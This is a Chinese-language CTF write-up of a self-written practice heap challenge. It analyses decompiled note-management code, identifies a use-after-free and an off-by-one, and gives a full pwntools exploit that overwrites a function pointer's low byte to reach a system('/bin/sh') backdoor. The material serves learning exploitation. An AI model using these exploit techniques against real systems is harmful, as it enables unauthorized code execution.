## 题目
自己编写了一个`UAF`的题目来加深对UAF的理解
> ([题目源码](https://github.com/Syscall-Byte/PWN-chal/tree/main/heap_learning/uaf)

### 查看保护
使用
```bash
checksec ./uaf_implement
```
查询程序保护，如下图
![[Pasted image 20260115215312.png]]
可以发现保护全开

### 分析程序
#### 修复结构体
首先先定义如下的结构体，在IDA中进行修复操作
```c
struct note {
	char notes[0x20];
	void (*print)(void*);
}
```
#### 分析程序
程序实现了4个功能，分别是`create_notes()`、`edit_notes()`、`del_notes()`、`exec_notes()`
1. `create_notes()`:
	```c
	__int64 create_notes()
	{
	  unsigned int idx; // [rsp+Ch] [rbp-34h] BYREF
	  _BYTE buf[40]; // [rsp+10h] [rbp-30h] BYREF
	  unsigned __int64 v3; // [rsp+38h] [rbp-8h]
	
	  v3 = __readfsqword(0x28u);
	  puts("where do you want to create the notes?");
	  __isoc99_scanf("%d", &idx);
	  if ( idx <= 2 )
	  {
	    puts("what information do you want to show?");
	    read(0, buf, 0x20uLL);
	    init_notes(&notes_ptr[idx], buf);
	    flag[idx] = 1;
	    return 1LL;
	  }
	  else
	  {
	    puts("Invalid index");
	    return 0LL;
	  }
	}
	```
	实现了一个创建堆块的过程
	并向`notes_ptr[idx].notes`中写入数据
2. `edit_notes()`：
	```c
	__int64 edit_notes()
	{
	  int idx; // [rsp+4h] [rbp-Ch] BYREF
	  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
	
	  v2 = __readfsqword(0x28u);
	  printf("where you want to edit:");
	  __isoc99_scanf("%d", &idx);
	  if ( flag[idx] )
	  {
	    puts("Sorry");
	    puts("This notes still in use");
	    puts("Please change your choice");
	    return 0LL;
	  }
	  else
	  {
	    puts("what do you want to change?");
	    read(0, notes_ptr[idx], 0x21uLL);
	    return 1LL;
	  }
	}
	```
	首先会判断`flag[idx]`是否为0，随后便会对`notes_ptr[idx].notes`开始写入`0x21`字节的数据，因为`notes`大小只有`0x20`，因此这里存在一个`Off-By-One`漏洞，可以覆盖下面那个`void`指针的最后一字节的值，从而实现一个任意执行
3. `del_notes()`：
	```c
	__int64 del_notes()
	{
	  unsigned int idx; // [rsp+4h] [rbp-Ch] BYREF
	  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
	
	  v2 = __readfsqword(0x28u);
	  printf("where you want to delete:");
	  __isoc99_scanf("%d", &idx);
	  if ( idx <= 2 )
	  {
	    if ( flag[idx] )
	    {
	      flag[idx] = 0;
	      free(notes_ptr[idx]);
	      puts("freed");
	      return 1LL;
	    }
	    else
	    {
	      puts("You cannot free a note twice!!!!!");
	      return 0LL;
	    }
	  }
	  else
	  {
	    puts("Invalid index");
	    return 0LL;
	  }
	}
	```
	这里在`free`之后未将指针清空，存在一个`UAF`漏洞
4. `exec_notes()`：
	```c
	__int64 exec_notes()
	{
	  unsigned int idx; // [rsp+4h] [rbp-Ch] BYREF
	  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
	
	  v2 = __readfsqword(0x28u);
	  printf("where do you want to know:");
	  __isoc99_scanf("%d", &idx);
	  if ( idx <= 2 || flag[idx] )
	  {
	    notes_ptr[idx]->print(notes_ptr[idx]);
	    return 1LL;
	  }
	  else
	  {
	    puts("Invalid index");
	    return 0LL;
	  }
	}
	```
	该功能会执行`note`结构体中`void`指针所指向的函数
在地址为`0x12B7`处存在后门函数`bc()`可以执行`system("/bin/sh")`
因此这个程序很简单，就是利用`UAF`漏洞修改`void`指针指向`bc()`随后便可以获取`shell`

### exp
```python
from pwn import *
context(arch = "amd64", os = "linux", log_level = "debug", terminal = ["tmux", "splitw", "-h"])
io = process("./uaf_implement")
#io = remote("nc1.ctfplus.cn", 46827)#nc nc1.ctfplus.cn 46827

#--------------------

sd = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
ru = lambda x : io.recvuntil(x)
r = lambda x : io.recv(x)
sla = lambda x, data : io.sendlineafter(x, data)
inter = lambda : io.interactive()
rl = lambda a = False : io.recvline(a)
sa = lambda x, data : io.sendafter(x, data)

#--------------------

def menu(x):
    sla(b"choice:", str(x).encode())

def create(idx, notes):
    menu(1)
    sla(b"notes?\n", str(idx).encode())
    sa(b"show?\n", notes)

def free(idx):
    menu(3)
    sla(b"delete:", str(idx).encode())

def edit(idx, notes):
    menu(2)
    sla(b"edit:", str(idx).encode())
    sa(b"change?", notes)

def exec(idx):
    menu(4)
    sla(b"know:", str(idx).encode())

create(0, b"111")
free(0)
create(1, b"222")
payload = cyclic(0x20) + b"\xbb"
edit(0, payload)
exec(1)
inter()
```
